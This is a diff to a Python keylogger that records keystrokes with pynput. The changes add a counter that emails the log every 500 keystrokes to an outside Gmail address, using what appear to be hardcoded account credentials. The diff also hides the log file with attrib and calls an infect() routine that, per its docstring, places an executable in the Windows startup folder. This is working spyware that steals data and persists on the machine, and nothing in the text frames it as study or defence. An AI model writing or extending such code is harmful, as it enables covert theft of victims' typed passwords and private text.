@@ -1,9 +1,9 @@
 from pynput import keyboard
 import time, subprocess
 
-f = open('log.txt', "a+")
-
 mayus = False
+
+max_strokes, n_strokes = 500, 0
 
 """
 Generate an executable at the startup's windows folder so the keylogger can be automatically runned
@@ -81,13 +81,17 @@ Very simple handler of the keyboard listener
 
 
 def on_press(key):
-    global mayus, f
+    global mayus, n_strokes
+
+    f = open('log.txt', "a+")
+
+    n_strokes += 1
 
     if key == keyboard.Key.esc:
+        f.close()
         return False  # stop listener
     try:
         k = key.char  # single-char keys
-        print(mayus)
         if (mayus):
             k = k.upper()
         f.write(k)
@@ -98,7 +102,6 @@ def on_press(key):
 
             if (k == "caps_lock"):
                 mayus = not mayus
-                print(mayus)
             if (k == "space"):
                 f.write(" ")
             elif (k == "enter"):
@@ -110,15 +113,24 @@ def on_press(key):
         except AttributeError:  # if a key has no name, raises an error
             f.write("[missing]")
 
+    f.close()
+
+    if(n_strokes==max_strokes):
+        send_mail('teamcyber541@gmail.com', 'thepantiesbreakers', 'teamcyber5412@gmail.com')
+        open('log.txt', 'w').close()
+        n_strokes = 0
+
+
+
 
 infect()
+
+open('log.txt', 'w').close()
+subprocess.check_call(["attrib", "+H", "log.txt"])
 
 listener = keyboard.Listener(on_press=on_press)
 
 listener.start()  # start to listen on a separate thread
 listener.join()  # remove if main thread is polling self.keys
-
-f.close()
-subprocess.check_call(["attrib","+H","log.txt"])
 
 send_mail('teamcyber541@gmail.com', 'thepantiesbreakers', 'teamcyber5412@gmail.com')
